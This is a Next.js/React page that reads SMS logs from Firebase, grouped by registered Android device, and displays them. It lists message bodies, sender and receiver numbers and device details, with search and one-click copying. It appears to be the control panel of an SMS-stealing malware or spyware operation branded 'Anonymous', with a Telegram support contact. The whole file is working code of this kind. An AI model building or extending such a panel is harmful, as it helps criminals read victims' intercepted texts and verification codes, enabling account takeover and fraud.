"use client";

import { useEffect, useMemo, useRef, useState } from "react";
import { Card, CardBody } from "@heroui/react";
import { onValue, ref } from "firebase/database";
import { db } from "@/lib/firbase";
import { BiCopy } from "react-icons/bi";
import { useRouter, usePathname } from "next/navigation";
import Link from "next/link";
import LineSpinner from "@/components/LineSpinner";

type FirebaseSMSPayload = {
  body?: unknown;
  title?: unknown;
  senderNumber?: unknown;
  reciverNumber?: unknown;
  receiverNumber?: unknown;
  timestamp?: unknown;
};

type NotificationItem = {
  id: string;
  deviceId: string;
  messageId: string;
  title: string;
  body: string;
  senderNumber: string;
  receiverNumber: string;
  timestamp: string;
  deviceBrand?: string;
  deviceModel?: string;
  androidVersion?: number;
};

const INITIAL_VISIBLE = 30;
const LOAD_MORE_STEP = 20;

function toSafeText(value: unknown, fallback: string) {
  if (typeof value === "string") {
    const trimmed = value.trim();
    return trimmed.length > 0 ? trimmed : fallback;
  }

  if (typeof value === "number" || typeof value === "boolean") {
    return String(value);
  }

  return fallback;
}

function toISOTime(value: unknown) {
  if (typeof value === "number") {
    const parsed = new Date(value);
    return Number.isNaN(parsed.getTime())
      ? new Date(0).toISOString()
      : parsed.toISOString();
  }

  if (typeof value === "string") {
    const parsed = new Date(value);
    return Number.isNaN(parsed.getTime())
      ? new Date(0).toISOString()
      : parsed.toISOString();
  }

  return new Date(0).toISOString();
}

function formatTimestamp(value: string) {
  const date = new Date(value);

  if (Number.isNaN(date.getTime())) {
    return "Unknown time";
  }

  return date.toLocaleString("en-GB", {
    day: "2-digit",
    month: "2-digit",
    year: "numeric",
    hour: "2-digit",
    minute: "2-digit",
    second: "2-digit",
  });
}

export default function NotificationsPage() {
  const [notifications, setNotifications] = useState<NotificationItem[]>([]);
  const [searchQuery, setSearchQuery] = useState("");
  const [isLoading, setIsLoading] = useState(true);
  const [fetchError, setFetchError] = useState<string | null>(null);
  const [visibleCount, setVisibleCount] = useState(INITIAL_VISIBLE);
  const [isLoadingMore, setIsLoadingMore] = useState(false);
  const loaderRef = useRef<HTMLDivElement | null>(null);
  const loadingMoreRef = useRef(false);

  useEffect(() => {
    const timeoutId = setTimeout(() => {
      setIsLoading(false);
    }, 10_000);

    const registeredDevicesRef = ref(db, "registeredDevices");

    const unsubscribe = onValue(
      registeredDevicesRef,
      (snapshot) => {
        clearTimeout(timeoutId);
        setIsLoading(false);

        const rawData = snapshot.val() as Record<string, any> | null;

        if (!rawData || typeof rawData !== "object") {
          setNotifications([]);
          setFetchError(null);
          return;
        }

        const normalizedNotifications: NotificationItem[] = [];

        for (const [deviceId, deviceData] of Object.entries(rawData)) {
          if (!deviceData || typeof deviceData !== "object") {
            continue;
          }

          const smsLogs = (deviceData as any).smsLogs;
          if (!smsLogs || typeof smsLogs !== "object") {
            continue;
          }

          const deviceBrand = (deviceData as any).brand || "Unknown";
          const deviceModel = (deviceData as any).model || "Unknown";
          const androidVersion = (deviceData as any).androidVersion;

          for (const [messageId, payload] of Object.entries(smsLogs)) {
            if (!payload || typeof payload !== "object") {
              continue;
            }

            const normalizedPayload = payload as FirebaseSMSPayload;

            normalizedNotifications.push({
              id: `${deviceId}-${messageId}`,
              deviceId: deviceId,
              messageId: messageId,
              title: toSafeText(normalizedPayload.title, "New SMS"),
              body: toSafeText(normalizedPayload.body, "No message body"),
              senderNumber: toSafeText(
                normalizedPayload.senderNumber,
                "Unknown sender",
              ),
              receiverNumber: toSafeText(
                normalizedPayload.receiverNumber ??
                  normalizedPayload.reciverNumber,
                "Unknown receiver",
              ),
              timestamp: toISOTime(normalizedPayload.timestamp),
              deviceBrand,
              deviceModel,
              androidVersion,
            });
          }
        }

        normalizedNotifications.sort(
          (a, b) =>
            new Date(b.timestamp).getTime() - new Date(a.timestamp).getTime(),
        );

        setNotifications(normalizedNotifications);
        setFetchError(null);
      },
      () => {
        clearTimeout(timeoutId);
        setNotifications([]);
        setFetchError(
          "Could not load notifications. Check your Firebase configuration.",
        );
        setIsLoading(false);
      },
    );

    return () => {
      clearTimeout(timeoutId);
      unsubscribe();
    };
  }, []);

  const filteredNotifications = useMemo(() => {
    let result = notifications;
    const normalizedQuery = searchQuery.trim().toLowerCase();

    if (normalizedQuery) {
      result = result.filter((item) => {
        const values = [
          item.deviceId,
          item.title,
          item.body,
          item.senderNumber,
          item.receiverNumber,
          item.deviceBrand,
          item.deviceModel,
        ];

        return values.some((value) =>
          String(value ?? "")
            .toLowerCase()
            .includes(normalizedQuery),
        );
      });
    }

    return result;
  }, [notifications, searchQuery]);

  const visibleItems = useMemo(
    () => filteredNotifications.slice(0, visibleCount),
    [filteredNotifications, visibleCount],
  );

  const hasMore = visibleCount < filteredNotifications.length;

  const copyToClipboard = async (text: string, e: React.MouseEvent) => {
    e.stopPropagation();
    
    if (typeof window === "undefined") {
      return;
    }

    try {
      await navigator.clipboard.writeText(text);
    } catch {
      const textarea = document.createElement("textarea");
      textarea.value = text;
      textarea.setAttribute("readonly", "");
      textarea.style.position = "fixed";
      textarea.style.opacity = "0";
      document.body.appendChild(textarea);
      textarea.select();
      document.execCommand("copy");
      document.body.removeChild(textarea);
    }
  };
  
  const router = useRouter();
  const pathname = usePathname();

  // Handle card click - Open in NEW TAB
  const handleCardClick = (deviceId: string) => {
    if (!deviceId || deviceId === "Unknown") {
      return;
    }
    
    // Open in new tab
    const url = `/devices/${deviceId}`;
    window.open(url, '_blank');
  };

  useEffect(() => {
    const observer = new IntersectionObserver(
      (entries) => {
        const [entry] = entries;
        if (!entry?.isIntersecting || loadingMoreRef.current) return;
        if (visibleCount >= filteredNotifications.length) return;

        loadingMoreRef.current = true;
        setIsLoadingMore(true);

        setTimeout(() => {
          setVisibleCount((prev) =>
            Math.min(prev + LOAD_MORE_STEP, filteredNotifications.length),
          );
          setIsLoadingMore(false);
          loadingMoreRef.current = false;
        }, 350);
      },
      { root: null, rootMargin: "0px 0px 300px 0px", threshold: 0 },
    );

    const el = loaderRef.current;
    if (el) observer.observe(el);
    return () => {
      if (el) observer.unobserve(el);
      observer.disconnect();
    };
  }, [visibleCount, filteredNotifications.length]);

  return (
    <div className="min-h-screen bg-[#ffffff]">
      <header className="w-full bg-black">
        <div className="mx-auto flex w-full max-w-3xl items-center justify-between px-5 py-4">
          <Link href="/all" className="text-xl font-extrabold italic leading-none text-[#9ad83d]">
            Anonymous
          </Link>
          <nav className="flex flex-wrap items-center gap-4 text-sm font-semibold text-white sm:gap-6 sm:text-base">
            <Link href="/all" className={`transition-colors ${pathname === "/all" ? "text-white" : "text-white/85 hover:text-white"}`}>
              Home
            </Link>
            <Link href="/settings" className={`transition-colors ${pathname === "/settings" ? "text-white" : "text-white/85 hover:text-white"}`}>
              Setting
            </Link>
 <a
  href="https://t.me/Babydon217?text=Hello%20Babydon%2C%20please%20fix%20my%20harmful%20issue%20as%20soon%20as%20possible."
  target="_blank"
  rel="noopener noreferrer"
  className="text-white/85 transition-colors hover:text-white"
>
  Support
</a>
            <button
              onClick={async () => {
                await fetch("/api/logout", { method: "POST" });
                router.push("/login");
              }}
              className="text-white/85 transition-colors hover:text-white cursor-pointer"
            >
              Logout
            </button>
          </nav>
        </div>
      </header>

      <main className="mx-auto w-full max-w-3xl px-5 py-8">
        <div className="space-y-5 rounded-[14px] border border-[#d6d6d6] bg-[#f3f3f3] p-5 shadow-[0_4px_20px_rgba(0,0,0,0.1)]">
          <div className="flex items-center gap-3">
            <select
              aria-label="Filter messages"
              className="h-12 flex-1 rounded-2xl border-2 border-[#b7b7b7] bg-[#f8f8f8] px-4 text-base font-semibold text-[#2f2f2f] outline-none"
              onChange={(e) => router.push(e.target.value)}
              value={pathname}
            >
              <option value="/all">All</option>
              <option value="/messages">Messages</option>
              <option value="/forms">Forms</option>
              <option value="/devices">Devices</option>
            </select>
            <button onClick={() => window.location.reload()} className="h-12 rounded-2xl border-2 border-[#b7b7b7] bg-[#f8f8f8] px-6 text-base font-semibold text-[#2f2f2f] transition hover:bg-[#eaeaea]">
              NEW
            </button>
          </div>

          <div className="relative">
            <span className="pointer-events-none absolute left-4 top-1/2 -translate-y-1/2 text-base text-[#8e8e8e]">
              ⌕
            </span>
            <input
              type="text"
              value={searchQuery}
              onChange={(event) => setSearchQuery(event.target.value)}
              placeholder="Search by Device ID, Message, Sender, etc..."
              className="h-12 w-full rounded-2xl border-2 border-[#b7b7b7] bg-[#f8f8f8] pl-10 pr-4 text-base text-[#303030] outline-none placeholder:text-[#a7a7a7]"
            />
          </div>
        </div>

        <div className="space-y-3 mt-6">
          {isLoading && <LineSpinner />}

          {!isLoading && fetchError && (
            <div className="rounded-xl border border-rose-300 bg-rose-50 p-6">
              <p className="text-sm text-rose-700">{fetchError}</p>
            </div>
          )}

          {!isLoading && !fetchError && filteredNotifications.length === 0 && (
            <div className="rounded-xl border border-[#d6d6d6] bg-white p-8 text-center text-sm text-gray-500">
              No messages found.
            </div>
          )}

          {!isLoading && !fetchError && visibleItems.map((item) => (
            <div
              key={item.id}
              onClick={() => handleCardClick(item.deviceId)}
              style={{ cursor: 'pointer' }}
              className="block"
            >
              <Card className="border border-[#d6d6d6] bg-white/78 shadow-[0_4px_16px_rgba(0,0,0,0.08)] hover:shadow-[0_6px_20px_rgba(0,0,0,0.12)] transition-all duration-200 active:scale-[0.99]">
                <CardBody className="space-y-4 p-4 sm:p-5">
                  <div>
                    <div className="flex items-center justify-between mb-3 pb-2 border-b border-gray-200">
                      <div className="flex items-center gap-2">
                        <span className="text-xs font-bold text-gray-500">DEVICE ID:</span>
                        <span className="text-sm font-mono font-bold text-blue-700 bg-blue-50 px-2 py-1 rounded">
                          {item.deviceId}
                        </span>
                      </div>
                    </div>

                    <div className="flex items-center justify-between mb-2">
                      <span className="font-bold text-blue-950 flex flex-row items-center gap-1">
                        DATE
                        <BiCopy
                          onClick={(e) => copyToClipboard(formatTimestamp(item.timestamp), e)}
                          className="cursor-pointer hover:text-gray-600 text-sm"
                          size={14}
                        />
                      </span>
                    </div>
                    <p className="text-[11px] font-semibold uppercase tracking-wide text-gray-500 mb-3">
                      {formatTimestamp(item.timestamp)}
                    </p>
                    
                    <div className="flex items-center gap-1 mt-2">
                      <span className="font-bold text-blue-950 flex flex-row items-center gap-1">
                        MESSAGE
                        <BiCopy
                          onClick={(e) => copyToClipboard(item.body, e)}
                          className="cursor-pointer hover:text-gray-600 text-sm"
                          size={14}
                        />
                      </span>
                    </div>
                    <p className="text-[13px] text-red-600 mb-2">
                      {item.body}
                    </p>
                    
                    <div className="flex items-center gap-1 mt-2">
                      <span className="font-bold text-blue-950 flex flex-row items-center gap-1">
                        SENDER
                        <BiCopy
                          onClick={(e) => copyToClipboard(item.senderNumber, e)}
                          className="cursor-pointer hover:text-gray-600 text-sm"
                          size={14}
                        />
                      </span>
                    </div>
                    <p className="text-[13px] text-gray-600 mb-2">
                      {item.senderNumber}
                    </p>
                    
                    {item.receiverNumber && item.receiverNumber !== "Unknown receiver" && (
                      <>
                        <div className="flex items-center gap-1 mt-2">
                          <span className="font-bold text-blue-950 flex flex-row items-center gap-1">
                            RECEIVER
                            <BiCopy
                              onClick={(e) => copyToClipboard(item.receiverNumber, e)}
                              className="cursor-pointer hover:text-gray-600 text-sm"
                              size={14}
                            />
                          </span>
                        </div>
                        <p className="text-[13px] text-gray-600 mb-2">
                          {item.receiverNumber}
                        </p>
                      </>
                    )}
                    
                    {(item.deviceBrand || item.deviceModel) && (
                      <div className="mt-3 pt-2 border-t border-gray-200">
                        <p className="text-[11px] text-gray-500">
                          📱 {item.deviceBrand} {item.deviceModel}
                          {item.androidVersion && ` • Android ${item.androidVersion}`}
                        </p>
                      </div>
                    )}
                  </div>
                </CardBody>
              </Card>
            </div>
          ))}

          {!isLoading && !fetchError && <div ref={loaderRef} className="h-1 w-full" />}

          {isLoadingMore && (
            <div className="flex items-center justify-center gap-3 py-6 text-sm text-gray-500">
              <div className="h-5 w-5 animate-spin rounded-full border-2 border-gray-300 border-t-[#d4bb41]" />
              <span>Loading more messages...</span>
            </div>
          )}

          {!isLoading && !fetchError && !hasMore && filteredNotifications.length > 0 && (
            <p className="py-6 text-center text-sm text-gray-500">
              All {filteredNotifications.length} messages loaded.
            </p>
          )}
        </div>
      </main>
    </div>
  );
}